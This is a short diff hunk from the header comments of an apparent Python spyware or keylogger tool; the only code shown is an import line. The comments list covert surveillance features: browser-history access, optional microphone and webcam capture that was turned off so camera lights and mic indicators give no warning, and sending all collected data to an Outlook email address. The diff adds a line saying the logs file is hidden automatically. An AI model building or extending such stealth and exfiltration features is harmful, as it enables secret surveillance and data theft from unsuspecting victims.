@@ -4,6 +4,7 @@
 # \ Ability to enable microphone and webcam sharing (I disabled this because some cameras light up and some software report that the mic is being used)
 # \ Access the browser history
 # \ Everything is send to an outlook email (you can change it in line 100)
+# \ The Public logs file is automatically hidden. 
 # \ All you need to have is python 3 installed and everything will install itself when executed.
 
 from multiprocessing.connection import wait
